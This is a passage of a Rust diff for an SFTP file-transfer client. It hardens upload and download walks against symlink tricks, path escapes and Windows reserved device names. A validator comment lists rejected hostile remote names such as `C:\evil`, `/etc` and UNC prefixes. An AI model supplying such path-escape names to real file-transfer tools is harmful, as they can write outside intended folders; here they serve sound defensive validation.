+            let entries = match std::fs::read_dir(&dir) {
+                Ok(entries) => entries,
+                Err(e) => {
+                    self.skip(&dir, &format!("it could not be read ({e})"));
+                    continue;
+                }
+            };
+            for entry in entries {
+                let entry = match entry {
+                    Ok(entry) => entry,
+                    Err(e) => {
+                        self.skip(&dir, &format!("an entry in it could not be read ({e})"));
+                        continue;
+                    }
+                };
+                let (path, name) = (entry.path(), entry.file_name());
+                let child_remote = join_remote(&dir_remote, &name.to_string_lossy());
+                // DirEntry::file_type does not follow a link.
+                match entry.file_type() {
+                    Ok(kind) if kind.is_symlink() => {
+                        if let Err(why) = self.follow_link(&path, &child_remote) {
+                            self.skip(&path, &why);
+                        }
+                    }
+                    Ok(kind) if kind.is_dir() => {
+                        stack.push((path, dir_resolved.join(&name), child_remote));
+                    }
+                    Ok(kind) if kind.is_file() => {
+                        self.file(&entry, &dir_resolved.join(&name), &child_remote);
+                    }
+                    Ok(_) => self.skip(&path, "it is not a regular file or folder"),
+                    Err(e) => self.skip(&path, &format!("it could not be read ({e})")),
+                }
             }
         }
-        return;
     }
-    if md.is_file() {
-        // F5: every expanded file re-passes the source authorization check -
-        // the root was validated by the caller, but descendants were not, so
-        // an allowed ancestor containing app data must not upload the vault.
-        if is_protected_upload_source(&local) {
-            log::warn!(
-                "[sshspan-sftp] upload: skipping protected source {}",
-                local.display()
-            );
+
+    /// A regular file met by the walk; `resolved` is its folder's resolved
+    /// path plus its name.
+    fn file(&mut self, entry: &std::fs::DirEntry, resolved: &std::path::Path, remote: &str) {
+        let path = entry.path();
+        if let Some(why) = self
+            .sensitive
+            .path_refusal(&path, resolved, LocalAccess::Read)
+        {
+            self.skip(&path, why);
             return;
         }
-        out.push(QueuedItem {
-            kind: JobKind::Upload,
-            session_id: session_id.clone(),
-            server_name: server_name.clone(),
-            local_path: local.display().to_string(),
-            remote_path: remote,
-            size: md.len(),
-            target: None,
-            resume: Some(resume),
-            preserve_ts: Some(preserve_ts),
-        });
-        return;
+        match entry.metadata() {
+            Ok(md) => self.jobs.push(self.ctx.upload(&path, remote, md.len())),
+            Err(e) => self.skip(&path, &format!("it could not be read ({e})")),
+        }
     }
-    let Ok(entries) = std::fs::read_dir(&local) else {
-        return;
-    };
-    for e in entries.flatten() {
-        let child = e.path();
-        let rname = format!(
-            "{}/{}",
-            remote.trim_end_matches('/'),
-            e.file_name().to_string_lossy()
-        );
-        expand_upload(
-            child,
-            rname,
-            session_id.clone(),
-            server_name.clone(),
-            resume,
-            preserve_ts,
-            out,
-        );
+
+    /// A link - the pick, or met by the walk: followed one level to a file
+    /// whose target may be read. `Err` says why it is not uploaded.
+    fn follow_link(&mut self, path: &std::path::Path, remote: &str) -> Result<(), String> {
+        match std::fs::metadata(path) {
+            Ok(target) if target.is_file() => match protected_upload_source(path, self.sensitive) {
+                Some(why) => Err(format!(
+                    "it links to a file that cannot be uploaded ({why})"
+                )),
+                None => {
+                    self.jobs.push(self.ctx.upload(path, remote, target.len()));
+                    Ok(())
+                }
+            },
+            Ok(target) if target.is_dir() => Err(
+                "it is a link to a folder (a symbolic link or junction), and links to folders \
+                 are not followed - pick the folder it points to instead"
+                    .to_string(),
+            ),
+            Ok(_) => Err("it links to something that is not a regular file".to_string()),
+            Err(e) => Err(format!("it is a link whose target cannot be read ({e})")),
+        }
+    }
+
+    fn skip(&mut self, path: &std::path::Path, why: &str) {
+        log::warn!("[sshspan-sftp] upload: skipping {}: {why}", path.display());
+        self.notes
+            .push(format!("skipped {}: {why}", path.display()));
     }
 }
 
@@ -1467,16 +3118,22 @@ fn sanitized_len_utf16(s: &str) -> usize {
 /// - Drive-letter prefixes (`C:`, `C:\evil`, `c:relative`) → reject: on
 ///   Windows `join` with such a name discards the base directory entirely.
 /// - Absolute-path prefixes (`/etc`, `\\server\share`) → reject.
-/// - Windows reserved device names - CON, PRN, AUX, NUL, COM1-9, LPT1-9,
-///   case-insensitive, with or without extension (`CON.exe`, `NUL.txt`) →
-///   reject: creating them redirects to a device or fails unpredictably.
+/// - A NUL byte → reject: C APIs see a shorter name than the server listed.
+/// - Windows reserved device names - CON, PRN, AUX, NUL, CONIN$, CONOUT$,
+///   COM0-9, LPT0-9 and COM/LPT with a superscript ¹ ² ³ - case-insensitive,
+///   with or without extension (`CON.exe`, `NUL.txt`) → reject: creating
+///   them redirects to a device or fails unpredictably.
 /// - Empty / whitespace-only → reject.
 /// - Windows-invalid characters `:*?"<>|` → sanitize to `_` (same mapping
 ///   as [`crate::sftp::sanitize_stage_base`], kept inline so the queue path
 ///   has no hidden coupling to the staging code).
 /// - Trailing dots or spaces → strip (Windows would drop them anyway, but
-///   the local name then differs from the remote one, so do it explicitly).
+///   the local name then differs from the remote one, so do it explicitly),
+///   and any other trailing whitespace with them.
 /// - Result empty after sanitization → reject.
+///
+/// Idempotent: a name it returns comes back unchanged from a second pass
+/// (the plain-name check relies on that).
 fn sanitize_remote_name(name: &str) -> Option<String> {
     let trimmed = name.trim();
     if trimmed.is_empty() {
@@ -1485,7 +3142,7 @@ fn sanitize_remote_name(name: &str) -> Option<String> {
     // Reject anything that carries path structure. `Path::is_absolute` alone
     // misses `C:relative` and `\\server`, so separators and drive letters are
     // checked explicitly.
-    if trimmed.contains('/') || trimmed.contains('\\') {
+    if trimmed.contains('/') || trimmed.contains('\\') || trimmed.contains('\0') {
         return None;
     }
     // Drive letter: exactly one ASCII alpha followed by ':', at the start.
@@ -1514,24 +3171,48 @@ fn sanitize_remote_name(name: &str) -> Option<String> {
         })
         .collect();
     // Trailing dots/spaces are stripped by Win32; strip here so the queue's
-    // path and the file on disk agree.
-    while sanitized.ends_with('.') || sanitized.ends_with(' ') {
+    // path and the file on disk agree. Any other trailing whitespace goes
+    // too, as `trim` above would take it on a second pass: the sanitizer is
+    // idempotent (its output passes the plain-name check of
+    // `derived_local_refusal`), where `notes\u{3000}.` used to become
+    // `notes\u{3000}` - and then be refused as not a plain name.
+    while sanitized
+        .chars()
+        .next_back()
+        .is_some_and(|c| c == '.' || c.is_whitespace())
+    {
         sanitized.pop();
     }
     if sanitized.is_empty() || sanitized.chars().all(|c| c == '.') {
         return None;
     }
-    // Windows reserved device names (CON, PRN, AUX, NUL, COM1-9, LPT1-9),
-    // with or without an extension: `CON`, `con.txt`, `NUL.tar.gz`.
-    let stem = sanitized.split('.').next().unwrap_or("");
-    const RESERVED: [&str; 22] = [
-        "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
-        "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
-    ];
-    if RESERVED.contains(&stem.to_uppercase().as_str()) {
+    // Windows reserved device names, with or without an extension: `CON`,
+    // `con.txt`, `NUL.tar.gz`, `CONIN$`, `COM¹.log`.
+    let stem = sanitized.split('.').next().unwrap_or("").to_uppercase();
+    if is_reserved_device_name(&stem) {
         return None;
     }
     Some(sanitized)
+}
+
+/// Whether `stem` (upper case) is a Windows device name: CON, PRN, AUX, NUL,
+/// CONIN$, CONOUT$, and COM or LPT followed by one digit 0-9 or a superscript
+/// ¹ ² ³ (all reserved by Win32 path handling).
+fn is_reserved_device_name(stem: &str) -> bool {
+    if matches!(stem, "CON" | "PRN" | "AUX" | "NUL" | "CONIN$" | "CONOUT$") {
+        return true;
+    }
+    let Some(rest) = stem
+        .strip_prefix("COM")
+        .or_else(|| stem.strip_prefix("LPT"))
+    else {
+        return false;
+    };
+    let mut chars = rest.chars();
+    matches!(
+        (chars.next(), chars.next()),
+        (Some('0'..='9' | '\u{b9}' | '\u{b2}' | '\u{b3}'), None)
+    )
 }
 
 /// Join a sanitized remote name under `dir` and verify the result stays under
@@ -1567,7 +3248,7 @@ fn safe_join_under(root: &std::path::Path, dir: &std::path::Path, name: &str) ->
 
 /// What a recursive walk needs to know about a directory entry.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum EntryKind {
+pub(crate) enum EntryKind {
     File,
     Dir,
     /// A symbolic link. Walks never follow one: it can point at an ancestor
@@ -1589,6 +3270,9 @@ struct ListedEntry {
     kind: EntryKind,
     size: u64,
     mtime: Option<u32>,
+    /// For an [`EntryKind::Unknown`] entry: what failed when its type was
+    /// asked for (shown in the walk's notes).
+    why: Option<String>,
 }
 
 /// Classify an entry from the attributes its directory listing carried.
@@ -1616,70 +3300,240 @@ fn classify_attrs(md: &russh_sftp::protocol::FileAttributes) -> Option<EntryKind
 
 /// List one remote directory for a walk, classified from the listing itself.
 /// Only an entry whose listing carried no file type costs extra round trips
-/// (see [`classify_untyped`]); if the LSTAT fails the entry is `Other` and
-/// skipped.
+/// (see [`classify_untyped`]); one whose type cannot be settled that way
+/// (its LSTAT fails, say) is `Unknown` - left alone by every walk - and
+/// carries the reason.
 async fn list_remote_dir(
     sftp: &russh_sftp::client::SftpSession,
     dir: &str,
 ) -> Result<Vec<ListedEntry>, String> {
     let entries = sftp.read_dir(dir).await.map_err(sftp_error_detail)?;
     let mut out = Vec::new();
+    // The folder's own REALPATH, asked for once for all its entries.
+    let mut parent = RealFolder::default();
     for entry in entries {
         let name = entry.file_name();
         if name == "." || name == ".." {
             continue;
         }
         let md = entry.metadata();
-        let kind = match classify_attrs(&md) {
-            Some(kind) => kind,
-            None => classify_untyped(sftp, &join_remote(dir, &name)).await,
+        let (kind, why) = match classify_attrs(&md) {
+            Some(kind) => (kind, None),
+            None => {
+                let path = join_remote(dir, &name);
+                let untyped = classify_untyped_in(sftp, &path, &mut parent).await;
+                (untyped.kind, untyped.why)
+            }
         };
         out.push(ListedEntry {
             name,
             kind,
             size: md.size.unwrap_or(0),
             mtime: md.mtime,
+            why,
         });
     }
     Ok(out)
 }
 
+/// What [`classify_untyped`] found out about an entry.
+struct Untyped {
+    kind: EntryKind,
+    /// For `Unknown`: what failed.
+    why: Option<String>,
+    /// READLINK said "not a link", or it resolves to itself: whatever it is,
+    /// it is not a symbolic link.
+    not_a_link: bool,
+}
+
 /// The kind of an entry whose listing carried no file type: LSTAT first; if
-/// the server leaves the type out there as well, READLINK tells a link apart
-/// (walks never follow one) and opening it as a folder tells a folder from a
-/// file. Whatever cannot be settled - LSTAT refused or the entry gone,
-/// READLINK unsupported, the folder probe refused - is `Unknown`: left alone,
-/// never guessed.
-async fn classify_untyped(sftp: &russh_sftp::client::SftpSession, path: &str) -> EntryKind {
+/// the server leaves the type out there as well, READLINK (walks never follow
+/// a link) and opening it as a folder (a folder or a file). Opening FOLLOWS a
+/// link, and READLINK does not always settle it - OpenSSH answers a non-link
+/// with BAD_MESSAGE, but other servers answer "failure" or "unsupported" for
+/// a link as well (one that said "failure" had a link walked as a folder:
+/// downloaded, chmod'ed and deleted through). So an entry counts as a folder
+/// only when it also resolves to itself (see [`resolves_to_itself`]), and as
+/// a file only when READLINK said "not a link" or it resolves to itself; one
+/// that resolves elsewhere is a link. Whatever cannot be settled - LSTAT
+/// refused or the entry gone, REALPATH failing, the folder probe refused -
+/// is `Unknown`: left alone, never guessed, and returned with what failed.
+async fn classify_untyped(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+) -> (EntryKind, Option<String>) {
+    let untyped = classify_untyped_in(sftp, path, &mut RealFolder::default()).await;
+    (untyped.kind, untyped.why)
+}
+
+/// [`classify_untyped`], with what it found out; the REALPATH of the folder
+/// `path` is in is kept in `parent` for the next entry of that folder.
+async fn classify_untyped_in(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+    parent: &mut RealFolder,
+) -> Untyped {
+    let settled = |kind, not_a_link| Untyped {
+        kind,
+        why: None,
+        not_a_link,
+    };
+    let unknown = |why, not_a_link| Untyped {
+        kind: EntryKind::Unknown,
+        why: Some(why),
+        not_a_link,
+    };
     match sftp.symlink_metadata(path).await {
         Ok(lstat) => {
             if let Some(kind) = classify_attrs(&lstat) {
-                return kind;
+                return settled(kind, kind != EntryKind::Symlink);
             }
         }
-        Err(_) => return EntryKind::Unknown,
+        Err(e) => return unknown(format!("LSTAT failed: {}", sftp_error_detail(e)), false),
     }
-    match sftp.read_link(path).await {
-        Ok(_) => return EntryKind::Symlink,
-        Err(e) if readlink_says_not_a_link(&e) => {}
-        Err(_) => return EntryKind::Unknown,
+    let readlink_says_no = match sftp.read_link(path).await {
+        Ok(_) => return settled(EntryKind::Symlink, false),
+        Err(e) => readlink_says_not_a_link(&e),
+    };
+    if !readlink_says_no {
+        match resolves_to_itself(sftp, path, parent).await {
+            Ok(true) => {}
+            Ok(false) => return settled(EntryKind::Symlink, false),
+            Err(why) => return unknown(why, false),
+        }
     }
-    probe_folder(sftp, path).await
+    // Not a link, from here on.
+    let outcome = sftp.read_dir(path).await.map(drop);
+    let why = outcome.as_ref().err().map(|e| {
+        format!(
+            "opening it as a folder failed: {}",
+            sftp_error_detail(e.clone())
+        )
+    });
+    match folder_probe_kind(outcome) {
+        // Checked above when READLINK did not settle it.
+        EntryKind::Dir if readlink_says_no => match resolves_to_itself(sftp, path, parent).await {
+            Ok(true) => settled(EntryKind::Dir, true),
+            Ok(false) => settled(EntryKind::Symlink, false),
+            Err(why) => unknown(why, true),
+        },
+        EntryKind::Unknown => Untyped {
+            kind: EntryKind::Unknown,
+            why,
+            not_a_link: true,
+        },
+        kind => settled(kind, true),
+    }
 }
 
-/// Whether a READLINK error means "this is not a link". OpenSSH's
+/// A folder and its REALPATH, kept for the next entry of the same folder.
+#[derive(Default)]
+struct RealFolder(Option<(String, String)>);
+
+/// Whether `path` is the entry it names and not a link to something else:
+/// REALPATH of `path` is REALPATH of its folder plus its name. (Opening a
+/// link as a folder follows it, so that alone cannot tell.) This relies on
+/// REALPATH resolving links, as OpenSSH's realpath(3) does; a server whose
+/// REALPATH only tidies the text cannot be told apart this way. `Err` says
+/// why it could not be checked. The folder's REALPATH is kept in `parent`:
+/// one round trip per folder, not per entry.
+async fn resolves_to_itself(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+    parent: &mut RealFolder,
+) -> Result<bool, String> {
+    let trimmed = path.trim_end_matches('/');
+    let (folder, name) = trimmed
+        .rsplit_once('/')
+        .filter(|(_, name)| !name.is_empty() && *name != "." && *name != "..")
+        .ok_or_else(|| format!("{path} is not a name in a folder"))?;
+    let folder = if folder.is_empty() { "/" } else { folder };
+    let real = |p: &str| {
+        let p = p.to_string();
+        async move {
+            sftp.canonicalize(p.clone())
+                .await
+                .map_err(|e| format!("REALPATH {p} failed: {}", sftp_error_detail(e)))
+        }
+    };
+    let folder_real = match &parent.0 {
+        Some((known, real)) if known == folder => real.clone(),
+        _ => {
+            let folder_real = real(folder).await?;
+            parent.0 = Some((folder.to_string(), folder_real.clone()));
+            folder_real
+        }
+    };
+    let real_path = real(trimmed).await?;
+    Ok(real_path == join_remote(&folder_real, name))
+}
+
+/// The attributes of `path` as LSTAT reports them - a file this app wrote and
+/// is about to rename or continue - provided it is a REGULAR file. A symbolic
+/// link is refused above all (STAT, which follows links, used to be asked: a
+/// temp file swapped for a link was renamed over the user's file). On a
+/// server that leaves the type bits out, READLINK, REALPATH and a folder
+/// probe tell a link or a folder apart (see [`classify_untyped`]).
+///
+/// `written`: the bytes this app just wrote to it, if it did. A server that
+/// answers the folder probe on a file with something other than "no such
+/// file" / "failure" (permission denied, say) cannot tell a file from a
+/// folder that way - every upload there failed. Such an entry is accepted
+/// when it is known not to be a link and LSTAT reports exactly `written`
+/// bytes: only a positive sign of a link or a folder refuses it.
+pub(crate) async fn regular_file_attrs(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+    written: Option<u64>,
+) -> Result<russh_sftp::protocol::FileAttributes, String> {
+    let md = sftp
+        .symlink_metadata(path)
+        .await
+        .map_err(|e| format!("{path} could not be checked ({})", sftp_error_detail(e)))?;
+    let untyped = match classify_attrs(&md) {
+        Some(kind) => Untyped {
+            kind,
+            why: None,
+            not_a_link: kind != EntryKind::Symlink,
+        },
+        None => classify_untyped_in(sftp, path, &mut RealFolder::default()).await,
+    };
+    match untyped.kind {
+        EntryKind::File => Ok(md),
+        EntryKind::Unknown if untyped.not_a_link && written.is_some() && md.size == written => {
+            Ok(md)
+        }
+        EntryKind::Symlink => Err(format!(
+            "{path} is not a regular file (it is a symbolic link)"
+        )),
+        EntryKind::Dir => Err(format!("{path} is not a regular file (it is a folder)")),
+        EntryKind::Other => Err(format!("{path} is not a regular file")),
+        EntryKind::Unknown => Err(format!(
+            "{path} is not known to be a regular file (the server does not say)"
+        )),
+    }
+}
+
+/// What LSTAT says `path` is (`None` when nothing is there), with
+/// [`classify_untyped`] for a server that leaves the type bits out.
+pub(crate) async fn lstat_kind(
+    sftp: &russh_sftp::client::SftpSession,
+    path: &str,
+) -> Option<EntryKind> {
+    let md = sftp.symlink_metadata(path).await.ok()?;
+    Some(match classify_attrs(&md) {
+        Some(kind) => kind,
+        None => classify_untyped(sftp, path).await.0,
+    })
+}
+
+/// Whether a READLINK error means "this is not a link": OpenSSH's
 /// sftp-server answers readlink(2)'s EINVAL with SSH_FX_BAD_MESSAGE (its
-/// `errno_to_portable`); other servers say "failure" or "no such file".
+/// `errno_to_portable`). "Failure" and "no such file" used to count too, but
+/// a server that answers every READLINK with "failure" says the same of a
+/// link - those, like "unsupported", leave it to [`resolves_to_itself`].
 fn readlink_says_not_a_link(e: &russh_sftp::client::error::Error) -> bool {
-    use russh_sftp::protocol::StatusCode;
-    sftp_status(
-        e,
-        &[
-            StatusCode::BadMessage,
-            StatusCode::Failure,
-            StatusCode::NoSuchFile,
-        ],
-    )
+    sftp_status(e, &[russh_sftp::protocol::StatusCode::BadMessage])
 }
 
 /// Whether `path` opens as a folder (following a link, like STAT); see
@@ -1753,6 +3607,15 @@ impl Notes {
         }
         notes
     }
+
+    /// [`Self::into_vec`] without giving the notes up.
+    fn to_vec(&self) -> Vec<String> {
+        Notes {
+            items: self.items.clone(),
+            total: self.total,
+        }
+        .into_vec()
+    }
 }
 
 /// Depth (directory levels below the folder the user picked) a recursive
@@ -1770,11 +3633,20 @@ const DOWNLOAD_MAX_ENTRIES: usize = 10_000;
 /// nothing behind.
 #[derive(Debug, Default)]
 struct DownloadPlan {
-    /// Local sub-directories to create, as sanitized path components below the
-    /// destination (the picked folder itself first, parents before children).
-    dirs: Vec<Vec<String>>,
+    /// Local sub-directories to create (the picked folder itself first,
+    /// parents before children).
+    dirs: Vec<PlannedDir>,
     files: Vec<PlannedFile>,
     notes: Notes,
+}
+
+/// A local folder a download plan creates.
+#[derive(Debug, Clone, PartialEq)]
+struct PlannedDir {
+    /// The server's path to the folder.
+    remote: String,
+    /// Sanitized components below the destination.
+    rel: Vec<String>,
 }
 
 #[derive(Debug, Clone, PartialEq)]
@@ -1811,7 +3683,10 @@ where
     LF: Future<Output = Result<Vec<ListedEntry>, String>>,
 {
     let mut plan = DownloadPlan::default();
-    plan.dirs.push(vec![root_name.to_string()]);
+    plan.dirs.push(PlannedDir {
+        remote: remote_root.to_string(),
+        rel: vec![root_name.to_string()],
+    });
     // Iterative on purpose: an explicit stack has no recursion depth to
     // overflow, whatever the server sends.
     let mut stack: Vec<(String, Vec<String>)> =
@@ -1852,9 +3727,8 @@ where
                     continue;
                 }
                 EntryKind::Unknown => {
-                    plan.notes.push(format!(
-                        "skipped {remote}: the server does not say whether it is a file or a folder"
-                    ));
+                    plan.notes
+                        .push(unknown_kind_note(&remote, entry.why.as_deref()));
                     continue;
                 }
                 EntryKind::File | EntryKind::Dir => {}
@@ -1878,7 +3752,10 @@ where
                     "skipped {remote}: nested deeper than {DOWNLOAD_MAX_DEPTH} levels"
                 ));
             } else {
-                plan.dirs.push(child_rel.clone());
+                plan.dirs.push(PlannedDir {
+                    remote: remote.clone(),
+                    rel: child_rel.clone(),
+                });
                 stack.push((remote, child_rel));
             }
         }
@@ -1886,29 +3763,61 @@ where
     Ok(plan)
 }
 
-/// Everything about one `sftp_queue_add` download item that is not the path.
-struct DownloadCtx<'a> {
-    session_id: &'a str,
-    server_name: &'a str,
+/// "skipped <remote>: ..." for an entry whose type could not be settled,
+/// with the reason when there is one (a failed LSTAT used to be reported as
+/// "the server does not say", hiding the cause).
+fn unknown_kind_note(remote: &str, why: Option<&str>) -> String {
+    match why {
+        Some(why) => {
+            format!("skipped {remote}: could not tell whether it is a file or a folder ({why})")
+        }
+        None => {
+            format!("skipped {remote}: the server does not say whether it is a file or a folder")
+        }
+    }
+}
+
+/// Everything about one `sftp_queue_add` item that is not a path.
+struct ItemCtx {
+    session_id: String,
+    server_name: String,
     resume: ResumeMode,
     preserve_ts: bool,
 }
 
-impl DownloadCtx<'_> {
-    fn item(&self, remote: &str, local: PathBuf, size: u64) -> QueuedItem {
+impl ItemCtx {
+    /// The item's settings for `item` of `batch`.
+    fn new(item: &serde_json::Value, batch: &BatchCtx<'_>) -> Self {
+        Self {
+            session_id: batch.session_id.to_string(),
+            server_name: batch.server_name.to_string(),
+            resume: item_resume(item, batch.resume),
+            preserve_ts: batch.preserve_ts,
+        }
+    }
+
+    fn job(&self, kind: JobKind, local: &std::path::Path, remote: &str, size: u64) -> QueuedItem {
         QueuedItem {
-            kind: JobKind::Download,
-            session_id: self.session_id.to_string(),
-            server_name: self.server_name.to_string(),
+            kind,
+            session_id: self.session_id.clone(),
+            server_name: self.server_name.clone(),
             local_path: local.display().to_string(),
             remote_path: remote.to_string(),
             size,
             target: None,
             resume: Some(self.resume),
-            // Honoured for downloads now: the queue stamps the remote mtime
+            // Honoured for downloads too: the queue stamps the remote mtime
             // onto the finished file (A7-36).
             preserve_ts: Some(self.preserve_ts),
         }
+    }
+
+    fn download(&self, remote: &str, local: PathBuf, size: u64) -> QueuedItem {
+        self.job(JobKind::Download, &local, remote, size)
+    }
+
+    fn upload(&self, local: &std::path::Path, remote: &str, size: u64) -> QueuedItem {
+        self.job(JobKind::Upload, local, remote, size)
     }
 }
 
@@ -1939,79 +3848,210 @@ fn join_local(root: &std::path::Path, rel: &[String]) -> Option<PathBuf> {
 /// queued here is verified to stay under it. Only the picked root is `stat`ed
 /// (and therefore followed, if it is a link: the user chose it); everything
 /// below it comes from the listings.
+///
+/// Test-only since RU6a: `sftp_queue_add` runs the two halves itself
+/// ([`prepare_download`] for every item first, then [`materialize_download`])
+/// so one failing item cannot leave local folders behind for the others.
+/// (Its tests need the unix-only in-process SFTP server.)
+#[cfg(all(test, unix))]
 async fn expand_download(
     sftp: &russh_sftp::client::SftpSession,
     remote: &str,
     root: &std::path::Path,
-    ctx: &DownloadCtx<'_>,
+    ctx: &ItemCtx,
     local_name: Option<&str>,
 ) -> Result<ExpandedDownload, String> {
+    expand_download_with(
+        sftp,
+        remote,
+        root,
+        ctx,
+        local_name,
+        &SensitiveLocations::current(),
+    )
+    .await
+}
+
+/// [`expand_download`] with the sensitive locations given.
+#[cfg(all(test, unix))]
+async fn expand_download_with(
+    sftp: &russh_sftp::client::SftpSession,
+    remote: &str,
+    root: &std::path::Path,
+    ctx: &ItemCtx,
+    local_name: Option<&str>,
+    sensitive: &SensitiveLocations,
+) -> Result<ExpandedDownload, String> {
+    let prepared = prepare_download(sftp, remote, local_name).await?;
+    let mut out = ExpandedDownload::default();
+    if let Some(why) = materialize_download(prepared, root, ctx, sensitive, &mut out) {
+        out.notes.push(why);
+    }
+    Ok(out)
+}
+
+/// What one picked remote path turned out to be, before anything local
+/// exists for it.
+enum Prepared {
+    /// One file: the server's path, its size and the local name to give it.
+    File {
+        remote: String,
+        size: u64,
+        name: String,
+    },
+    /// A folder and its walk.
+    Folder(DownloadPlan),
+    /// Nothing to download, and why.
+    Skip(String),
+}
+
+/// The remote half of [`expand_download`]: STAT the picked path, settle what
+/// it is (the STAT alone used to decide, so on a server that leaves the type
+/// bits out a folder was queued as one file) and walk it if it is a folder.
+/// Touches nothing locally.
+async fn prepare_download(
+    sftp: &russh_sftp::client::SftpSession,
+    remote: &str,
+    local_name: Option<&str>,
+) -> Result<Prepared, String> {
     let md = sftp
         .metadata(remote)
         .await
         .map_err(|e| format!("stat {remote}: {}", sftp_error_detail(e)))?;
-    let mut out = ExpandedDownload::default();
-    if !md.is_dir() {
-        // Single file: its name comes from the user-picked remote path (not a
-        // ReadDir entry), but sanitize anyway - the path string still
-        // originates from the server's view of the filesystem. A
-        // renderer-supplied `local_name` (the download-rename conflict action)
-        // replaces the basename and goes through the same containment check,
-        // so a rename cannot escape the destination.
-        let raw = local_name.unwrap_or_else(|| remote.rsplit('/').next().unwrap_or("file"));
-        let Some(local) = safe_join_under(root, root, raw) else {
-            log::warn!("[sshspan-sftp] skipping download of {remote}: unsafe local name {raw:?}");
-            out.notes.push(format!(
-                "skipped {remote}: {raw:?} cannot be used as a local file name"
-            ));
-            return Ok(out);
-        };
-        out.items
-            .push(ctx.item(remote, local, md.size.unwrap_or(0)));
-        return Ok(out);
+    match picked_root_kind(sftp, remote, &md).await {
+        // A link the user picked is followed (STAT follows it), so a picked
+        // path is never reported as one; a file it is.
+        EntryKind::File | EntryKind::Symlink => {
+            // The name comes from the user-picked remote path (not a ReadDir
+            // entry), but is sanitized anyway - the path string still
+            // originates from the server's view of the filesystem. A
+            // renderer-supplied `local_name` (the download-rename conflict
+            // action) replaces the basename and goes through the same
+            // checks, so a rename cannot escape the destination either.
+            let name = local_name.unwrap_or_else(|| remote.rsplit('/').next().unwrap_or("file"));
+            Ok(Prepared::File {
+                remote: remote.to_string(),
+                size: md.size.unwrap_or(0),
+                name: name.to_string(),
+            })
+        }
+        EntryKind::Dir => {
+            let raw_dir = remote.rsplit('/').next().unwrap_or("dir");
+            let Some(root_name) = sanitize_remote_name(raw_dir) else {
+                log::warn!(
+                    "[sshspan-sftp] skipping download dir {remote}: unsafe local name {raw_dir:?}"
+                );
+                return Ok(Prepared::Skip(format!(
+                    "skipped {remote}: {raw_dir:?} cannot be used as a local folder name"
+                )));
+            };
+            let plan = plan_download(remote, &root_name, |dir| async move {
+                list_remote_dir(sftp, &dir).await
+            })
+            .await?;
+            Ok(Prepared::Folder(plan))
+        }
+        // Reading a FIFO blocks the server until a writer appears.
+        EntryKind::Other => Ok(Prepared::Skip(format!(
+            "skipped {remote}: not a regular file or folder"
+        ))),
+        EntryKind::Unknown => Err(format!(
+            "Could not tell whether {remote} is a file or a folder (the server does not say), \
+             so it was not queued."
+        )),
     }
-    let raw_dir = remote.rsplit('/').next().unwrap_or("dir");
-    let Some(root_name) = sanitize_remote_name(raw_dir) else {
-        log::warn!("[sshspan-sftp] skipping download dir {remote}: unsafe local name {raw_dir:?}");
-        out.notes.push(format!(
-            "skipped {remote}: {raw_dir:?} cannot be used as a local folder name"
-        ));
-        return Ok(out);
+}
+
+/// The local half of [`expand_download`]: create the folders a prepared
+/// download needs and turn it into jobs. `root` is the canonical destination.
+/// Every FOLDER is checked in full (see [`derived_local_refusal`]) - a
+/// refused one is not created and nothing below it is queued - and resolved
+/// once it exists; a FILE is then judged by that resolved folder and its own
+/// name, without touching the disk (see [`file_write_refusal`]). `Some(reason)`
+/// when NOTHING can be made for the item - its file or its folder itself is
+/// refused, or it was skipped - so a batch reports it as that item's error
+/// rather than as "queued: 0".
+fn materialize_download(
+    prepared: Prepared,
+    root: &std::path::Path,
+    ctx: &ItemCtx,
+    sensitive: &SensitiveLocations,
+    out: &mut ExpandedDownload,
+) -> Option<String> {
+    let plan = match prepared {
+        Prepared::Skip(note) => return Some(note),
+        Prepared::File { remote, size, name } => {
+            let Some(local) = safe_join_under(root, root, &name) else {
+                log::warn!(
+                    "[sshspan-sftp] skipping download of {remote}: unsafe local name {name:?}"
+                );
+                return Some(format!(
+                    "skipped {remote}: {name:?} cannot be used as a local file name"
+                ));
+            };
+            if let Some(why) = derived_local_refusal_under(root, root, &local, sensitive) {
+                return Some(format!("skipped {remote}: {why}"));
+            }
+            out.items.push(ctx.download(&remote, local, size));
+            return None;
+        }
+        Prepared::Folder(plan) => plan,
     };
-    let plan = plan_download(remote, &root_name, |dir| async move {
-        list_remote_dir(sftp, &dir).await
-    })
-    .await?;
+    // The picked folder itself (always the first entry) refused: nothing
+    // at all is made for this item.
+    if let Some(root_dir) = plan.dirs.first() {
+        let refused = match join_local(root, &root_dir.rel) {
+            Some(path) => derived_local_refusal_under(root, root, &path, sensitive),
+            None => Some("its name cannot be used as a local folder name".to_string()),
+        };
+        if let Some(why) = refused {
+            return Some(format!("skipped {}: {why}", root_dir.remote));
+        }
+    }
     out.notes.extend(plan.notes);
 
     // The walk is within its caps; now (and only now) touch the disk.
+    // `made`: each folder created, with its resolved path.
+    let mut made: std::collections::HashMap<PathBuf, PathBuf> = std::collections::HashMap::new();
     let mut rejected: Vec<PathBuf> = Vec::new();
-    for rel in &plan.dirs {
-        let Some(path) = join_local(root, rel) else {
+    for dir in &plan.dirs {
+        let Some(path) = join_local(root, &dir.rel) else {
             continue;
         };
         if rejected.iter().any(|r| path.starts_with(r)) {
             continue;
         }
-        let made = tokio::fs::create_dir_all(&path).await;
+        if let Some(why) = derived_local_refusal_under(root, root, &path, sensitive) {
+            out.notes.push(format!(
+                "skipped {} and everything in it: {why}",
+                dir.remote
+            ));
+            rejected.push(path);
+            continue;
+        }
+        let created = std::fs::create_dir_all(&path);
         // create_dir_all may have been steered through a symlinked directory
         // (planted locally, or created by another queued job): re-anchor at
         // the canonical path and refuse anything that leaves the destination.
-        let inside = matches!(
-            tokio::fs::canonicalize(&path).await,
-            Ok(real) if real.starts_with(root)
-        );
-        if made.is_err() || !inside {
-            log::warn!(
-                "[sshspan-sftp] skipping download dir {}: could not be created under {}",
-                path.display(),
-                root.display()
-            );
-            out.notes.push(format!(
-                "skipped {}: could not be created locally",
-                path.display()
-            ));
-            rejected.push(path);
+        let real = canonical(&path)
+            .ok()
